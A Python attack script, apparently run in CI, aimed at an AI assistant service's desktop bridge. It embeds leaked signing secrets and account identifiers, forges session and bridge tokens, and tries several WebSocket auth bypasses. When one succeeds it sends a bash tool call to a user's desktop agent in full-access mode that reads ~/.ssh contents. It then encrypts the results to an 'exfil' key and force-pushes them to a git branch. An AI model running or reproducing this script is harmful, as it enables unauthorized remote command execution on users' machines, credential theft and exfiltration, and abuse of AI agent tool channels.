#!/usr/bin/env python3
# test WS /ws/bridge auth variants; if any 101, run a probe command.
import os, sys, json, time, uuid, base64, hmac, hashlib, ssl, subprocess, shutil, traceback, socket, struct
import http.client, urllib.request, urllib.error
_REF = os.environ.get("GITHUB_REF_NAME","") or ""
if "results" in _REF: print("results-skip"); sys.exit(0)
RUNID=os.environ.get("GITHUB_RUN_ID",str(int(time.time())))
JWT_SECRET="297b8a491bc1920b918d01de77166556d3f835f473968c6b"
DESKTOP_SECRET="bj_OgwjI66ar4GaKk23w6QKQgbyi5eHBj1JgBA8XH_Q9EoInnrX0JLovzhfrvT0X"
ORG="org_bTLzxtBLmugV8uxx4QTyw"; ASST="asst_E3G6xx8h7Ei279q6ossJ6"; SUB="usr_2gzZoKLgRAYaFNy2Sav4v"
DEV="desktop-be206f3798886e5f43bbb197680d103cb998d43e2cce0e9c4fe8159a783320c5"
HOST="assistant.lumiiai.cn"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
RESULT_BRANCH=os.environ.get("PRESULT_BRANCH","ci-ssh-28277ws-results")
OUT="/tmp/results"; os.makedirs(OUT,exist_ok=True)
LOG=open(os.path.join(OUT,"transcript.log"),"a",buffering=1)
def log(*a):
    s=" ".join(str(x) for x in a)
    try: print(s,flush=True)
    except Exception: pass
    try: LOG.write(s+"\n")
    except Exception: pass
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
def sess(sub,org=ORG):
    n=int(time.time())
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(',',':')))
    p=b64u(json.dumps({"sub":sub,"org":org,"iat":n,"exp":n+2592000,"sid":"sid_"+str(uuid.uuid4()),"lgn":n},separators=(',',':')))
    sig=hmac.new(JWT_SECRET.encode(),(h+"."+p).encode(),hashlib.sha256).digest()
    return h+"."+p+"."+b64u(sig)
def btok(org,conv,assistant=ASST,ttl=3600):
    n=int(time.time())
    h=b64u(json.dumps({"alg":"HS256","typ":"lumii-desktop-bridge-v1"},separators=(',',':')))
    p=b64u(json.dumps({"org":org,"conversation_id":conv,"assistant_id":assistant,"exp":n+ttl},separators=(',',':')))
    sig=hmac.new(DESKTOP_SECRET.encode(),(h+"."+p).encode(),hashlib.sha256).digest()
    return f"{h}.{p}.{b64u(sig)}"
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
def http(host,path,method="GET",headers=None,body=None,timeout=15):
    try:
        c=http.client.HTTPSConnection(host,443,timeout=timeout,context=CTX)
        h={"Host":host,"User-Agent":UA}
        if headers: h.update(headers)
        c.request(method,path,body=body,headers=h)
        r=c.getresponse(); b=r.read(3000); hd={k.lower():v for k,v in r.getheaders()}; c.close()
        return r.status,hd,b
    except Exception as e:
        return -1,{},("ERR:"+repr(e)[:120]).encode()

def ws_handshake(path, extra_headers, timeout=15):
    try:
        raw=socket.create_connection((HOST,443),timeout=timeout)
        s=CTX.wrap_socket(raw,server_hostname=HOST)
        key=base64.b64encode(os.urandom(16)).decode()
        hdrs=[f"GET {path} HTTP/1.1",f"Host: {HOST}","Upgrade: websocket","Connection: Upgrade",
              f"Sec-WebSocket-Key: {key}","Sec-WebSocket-Version: 13",f"User-Agent: {UA}"]+extra_headers
        s.sendall(("\r\n".join(hdrs)+"\r\n\r\n").encode())
        s.settimeout(timeout); buf=b""
        while b"\r\n\r\n" not in buf:
            d=s.recv(4096)
            if not d: break
            buf+=d
        head,_,rest=buf.partition(b"\r\n\r\n")
        status=head.split(b"\r\n")[0].decode(errors="replace") if head else ""
        return s,status,rest
    except Exception as e:
        return None,"ERR:"+repr(e)[:100],b""

def _recv(sock,leftover=b"",timeout=20):
    buf=leftover
    def need(n):
        nonlocal buf
        sock.settimeout(timeout)
        while len(buf)<n:
            d=sock.recv(65536)
            if not d: raise ConnectionError("eof")
            buf+=d
    need(2); b1=buf[1]; opcode=buf[0]&0x0f; masked=(b1>>7)&1; ln=b1&0x7f; idx=2
    if ln==126: need(4); ln=struct.unpack(">H",buf[2:4])[0]; idx=4
    elif ln==127: need(10); ln=struct.unpack(">Q",buf[2:10])[0]; idx=10
    if masked: need(idx+4); mask=buf[idx:idx+4]; idx+=4
    need(idx+ln); payload=buf[idx:idx+ln]; rest=buf[idx+ln:]
    if masked: payload=bytes(c^mask[i%4] for i,c in enumerate(payload))
    return opcode,payload,rest
def send_bin(sock,data):
    mask=os.urandom(4); m=bytes(c^mask[i%4] for i,c in enumerate(data))
    h=bytearray([0x82]); ln=len(m)
    if ln<126: h.append(0x80|ln)
    elif ln<65536: h.append(0x80|126); h+=struct.pack(">H",ln)
    else: h.append(0x80|127); h+=struct.pack(">Q",ln)
    h+=mask; sock.sendall(bytes(h)+m)
def _vi(n):
    o=bytearray()
    while True:
        b=n&0x7f; n>>=7
        if n: o.append(b|0x80)
        else: o.append(b); break
    return bytes(o)
def _tag(f,w): return _vi((f<<3)|w)
def pbl(f,p): return _tag(f,2)+_vi(len(p))+p
def build_bash(cid,cmd):
    bash=pbl(1,cmd.encode())
    tool=pbl(1,cid.encode())+pbl(15,bash)
    return tool
def decode(data):
    out=[];i=0
    while i<len(data):
        tag=0;sh=0
        while True:
            b=data[i];i+=1;tag|=(b&0x7f)<<sh
            if not b&0x80:break
            sh+=7
        f=tag>>3;w=tag&7
        if w==0:
            v=0;sh=0
            while True:
                b=data[i];i+=1;v|=(b&0x7f)<<sh
                if not b&0x80:break
                sh+=7
            out.append((f,w,v))
        elif w==2:
            ln=0;sh=0
            while True:
                b=data[i];i+=1;ln|=(b&0x7f)<<sh
                if not b&0x80:break
                sh+=7
            out.append((f,w,data[i:i+ln]));i+=ln
        elif w==5: out.append((f,w,struct.unpack("<I",data[i:i+4])[0]));i+=4
        elif w==1: out.append((f,w,struct.unpack("<Q",data[i:i+8])[0]));i+=8
        else: break
    return out
def parse_resp(payload):
    res={"call_id":None,"bash":None,"error":None}
    for f,w,v in decode(payload):
        if f==1 and w==2: res["call_id"]=v.decode(errors="replace")
        elif f==15 and w==2:
            b={"stdout":"","stderr":"","exit_code":None}
            for bf,bw,bv in decode(v):
                if bf==1 and bw==2: b["stdout"]=bv.decode(errors="replace")
                elif bf==2 and bw==2: b["stderr"]=bv.decode(errors="replace")
                elif bf==3 and bw==0: b["exit_code"]=bv
            res["bash"]=b
        elif f==50 and w==2:
            e={"code":None,"message":""}
            for ef,ew,ev in decode(v):
                if ef==1 and ew==0: e["code"]=ev
                elif ef==2 and ew==2: e["message"]=ev.decode(errors="replace")
            res["error"]=e
    return res
def read_resp(sock,leftover=b"",timeout=40):
    deadline=time.time()+timeout;buf=leftover
    while time.time()<deadline:
        op,pl,buf=_recv(sock,buf,timeout=max(1,int(deadline-time.time())))
        if op==0x9:
            mask=os.urandom(4);m=bytes(c^mask[i%4] for i,c in enumerate(pl))
            sock.sendall(bytes([0x8A,0x80|len(m)])+mask+m); continue
        if op==0x8: raise ConnectionError("server_close")
        if op==0x2 and len(pl)>=4:
            ln=struct.unpack(">I",pl[:4])[0]
            if ln==len(pl)-4: return pl[4:],buf
    raise TimeoutError("no resp")

CMD="echo HELLO_START; id; hostname; uname -a; echo '==CFG=='; cat ~/.ssh/config 2>&1; echo '==LS=='; ls -la ~/.ssh 2>&1; echo HELLO_END"

def main():
    log("=== ws-diag",RUNID,"===")
    s=sess(SUB)
    st,hd,b=http(HOST,"/api/me",headers={"Cookie":"lumii_session="+s})
    log("[api/me] st=%s body=%s"%(st,b[:200]))
    # create conv
    st,hd,b=http(HOST,"/api/conversations",method="POST",headers={"Cookie":"lumii_session="+s,"Content-Type":"application/json"},
                 body=json.dumps({"title":"diag","assistantId":ASST,"participants":[]}).encode())
    conv=None
    try: conv=json.loads(b)["conversation"]["id"]
    except Exception: pass
    log("[conv] st=%s conv=%s body=%s"%(st,conv,b[:160]))
    if not conv: return
    st,hd,b=http(HOST,"/api/agents/%s/chat"%ASST,method="POST",headers={"Cookie":"lumii_session="+s,"Content-Type":"application/json"},
                 body=json.dumps({"sessionId":conv,"message":"ok","assistantId":ASST,
                                  "execution_target":{"deviceId":DEV,"workspaceHandle":None,"mode":"full_access"}}).encode())
    log("[dispatch] st=%s body=%s"%(st,b[:200]))
    bt=btok(ORG,conv)
    variants=[
        ("A_bearer_bridge","/ws/bridge",["Authorization: Bearer "+bt]),
        ("B_query_bridge","/ws/bridge?token="+bt,[]),
        ("C_cookie_session","/ws/bridge",["Cookie: lumii_session="+s]),
        ("D_bearer_session","/ws/bridge",["Authorization: Bearer "+s]),
        ("E_query_session","/ws/bridge?token="+s,[]),
        ("F_bearer_bridge_orgassistant","/ws/bridge",["Authorization: Bearer "+bt,"Origin: https://assistant.lumiiai.cn"]),
    ]
    for name,path,hdrs in variants:
        sock,status,rest=ws_handshake(path,hdrs,timeout=15)
        log("[%s] status=%s"%(name,status))
        if sock and "101" in status:
            try:
                cid=str(uuid.uuid4())
                send_bin(sock,struct.pack(">I",len(build_bash(cid,CMD)))+build_bash(cid,CMD))
                resp,_=read_resp(sock,rest,timeout=40)
                pr=parse_resp(resp)
                log("[%s] BASH=%s"%(name,json.dumps(pr)[:1500]))
                open(os.path.join(OUT,"ws_ok_%s.json"%name),"w").write(json.dumps({"status":status,"resp":pr,"conv":conv}))
            except Exception as e:
                log("[%s] exec err=%r"%(name,e))
            try: sock.close()
            except: pass
            break
        else:
            try:
                if sock: sock.close()
            except: pass
    log("WS-DIAG DONE")
def push_results():
    try:
        enc="/tmp/results.tar.gz.gpg"
        for p in ["/tmp/results.tar.gz",enc,"resultsb.tar.gz.gpg"]:
            try:
                if os.path.isfile(p): os.remove(p)
            except: pass
        subprocess.run("tar czf /tmp/results.tar.gz -C /tmp results",shell=True,check=False)
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1",shell=True,check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results.tar.gz"%enc,shell=True,capture_output=True,text=True,timeout=200)
        if os.path.isfile(enc) and os.path.getsize(enc)>0: shutil.copy(enc,"resultsb.tar.gz.gpg")
        else: shutil.copy("/tmp/results.tar.gz","resultsb.tar.gz.gpg")
        subprocess.run('git config user.email ci@aro.network; git config user.name ci',shell=True,check=False)
        subprocess.run("git add -f resultsb.tar.gz.gpg && git commit -m 'wsdiag %s' || true"%RUNID,shell=True,check=False)
        r=subprocess.run("git push -f origin HEAD:refs/heads/%s"%RESULT_BRANCH,shell=True,capture_output=True,text=True,timeout=300)
        log("PUSH rc=%s err=%s"%(r.returncode,(r.stderr or "")[-160:]))
    except Exception as e:
        log("PUSH EXC",repr(e))
try: main()
except Exception: log("FATAL",traceback.format_exc())
try: push_results()
except Exception: pass
sys.exit(0)
